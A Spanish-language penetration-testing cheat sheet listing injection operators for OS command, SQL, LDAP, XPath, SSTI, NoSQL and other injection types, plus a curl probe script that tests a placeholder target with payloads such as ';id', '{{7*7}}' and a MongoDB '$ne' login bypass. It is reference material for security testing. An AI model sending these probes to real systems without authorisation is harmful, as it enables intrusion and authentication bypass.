---
aliases:
tags:
  - vuln/command-injection
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[OS Command Injection]]"
---
# Command Injection - Operadores Específicos por Tipo de Injection

---

## Cheatsheet

| **Inyección** | **Operadores que funcionan** | **Cuándo usar** |
|:---:|:---:|:---:|
| **OS Command** (sh/bash) | `;` `&` `\|` `&&` `\|\|` `` ` `` `$()` `\n` | Backend ejecuta shell — `system()`, `exec()`, `popen()`. |
| **OS Command** (cmd.exe) | `&` `&&` `\|\|` `\|` `\n` (NO `;`) | Backend Windows con `cmd.exe`. |
| **OS Command** (PowerShell) | `;` `&` `\|` `\|\|` `&&` (PS 7+) | Backend PowerShell — acepta sintaxis sh-like. |
| **SQL Injection** | `'` `;` `--` `/* */` `#` | Backend pasa input a query SQL. Comments tail-off para descartar resto. |
| **LDAP Injection** | `*` `(` `)` `&` `\|` `!` | Input concatenado en filtro LDAP — manipular boolean logic. |
| **XPath Injection** | `'` `or` `and` `not` `substring()` `concat()` `count()` | Input en query XPath. Boolean attacks tipo SQLi. |
| **Code Injection (eval)** | `'` `;` `$()` `${}` `#{}` `%{}` | `eval()`/`exec()`/`Function()` en backend — RCE directo. |
| **Path Traversal** | `../` `..\\` `%2e%2e%2f` `%00` `..;/` | Path concatenado sin normalizar — escape de directorio. |
| **CRLF / Header Injection** | `\r\n` `%0d%0a` `%0a` `\t` `%09` | Input reflejado en HTTP headers/SMTP/logs. |
| **NoSQL Injection** | `$ne` `$gt` `$where` `$regex` (operators) | Input en query MongoDB con operadores `$`. |
| **Template Injection (SSTI)** | `{{ }}` `${ }` `<% %>` `#{ }` | Input renderizado por engine de templates (Jinja2/Twig/ERB). |
| **Shellcode** | `\x` `\u` `%u` `%n` | Inyección en C/C++ vulnerable, format strings, buffer overflows. |
^ci-operadores-especificos

### Cómo identificar el tipo de injection

```bash
# Probe rápido para discriminar
PAYLOAD=$1  # ej: '127.0.0.1'

# 1. OS Command — buscar reflejo de comando shell
curl "https://target/?input=${PAYLOAD};id" | grep -E 'uid=|gid='

# 2. SQL — error de sintaxis al añadir comilla
curl "https://target/?input=${PAYLOAD}'" | grep -iE 'syntax error\|mysql\|postgres\|sqlite'

# 3. SSTI — math evaluado por engine
curl "https://target/?input={{7*7}}" | grep -q '49'  # Jinja2/Twig
curl "https://target/?input=\${7*7}" | grep -q '49'  # FreeMarker/JSP

# 4. LDAP — wildcard que cambia comportamiento
curl "https://target/?user=*" | head  # match-all puede romper response

# 5. NoSQL — operator que bypasea auth
curl -X POST https://target/login \
  -H 'Content-Type: application/json' \
  -d '{"user":"admin","pass":{"$ne":"x"}}'
```

---
